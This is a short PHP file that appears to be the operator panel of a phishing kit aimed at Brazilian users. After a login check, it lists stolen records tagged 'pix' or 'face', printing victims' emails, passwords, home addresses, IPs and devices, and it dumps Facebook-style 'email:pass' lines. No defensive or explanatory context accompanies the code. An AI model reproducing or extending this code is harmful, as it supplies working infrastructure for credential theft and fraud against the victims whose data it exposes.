<?php
error_reporting(0);
ini_set(display_errors, 0);

require_once ("internal/conexao.php");

session_start();


if (isset($_SESSION ['logged'])) {
	
	$ver = addslashes ($_GET ['ver']);
	
	if ($ver == 'pix') {
		
		$dadosQA = "SELECT* FROM dados_cliente where pix=1 order by id desc";
		$conQA = $mysqli->query($dadosQA) or die($mysqli->error);

		
	} else if ($ver == 'face') {
		
		$dadosQA = "SELECT* FROM dados_cliente where face=1 order by id desc";
		$conQA = $mysqli->query($dadosQA) or die($mysqli->error);
		
	}

	
}

?>

<?php if ($ver == 'pix') { ?>

<?php while ($consultaQA = $conQA->fetch_array()) {  ?>


Email: <?php echo $consultaQA ['email'] ?><br>
Senha: <?php echo $consultaQA ['pass'] ?> <br>
Endereço: <?php echo $consultaQA ['rua'] ?>, <?php echo $consultaQA ['numero'] ?>, <?php echo $consultaQA ['bairro'] ?> - <?php echo $consultaQA ['cidade'] ?>/<?php echo $consultaQA ['estado'] ?> | <?php echo $consultaQA ['cep'] ?> ,br>
IP: <?php echo $consultaQA ['ip'] ?> <br>
Dispositivo: <?php echo $consultaQA ['dispositivo'] ?><br>
<hr>
<br>

<?php } ?>

<?php } ?>


<?php if ($ver == 'face') { ?>

<?php while ($consultaQA = $conQA->fetch_array()) {  ?>


<?php echo $consultaQA ['email'] ?>:<?php echo $consultaQA ['pass'] ?> 
<br>

<?php } ?>

<?php } ?>
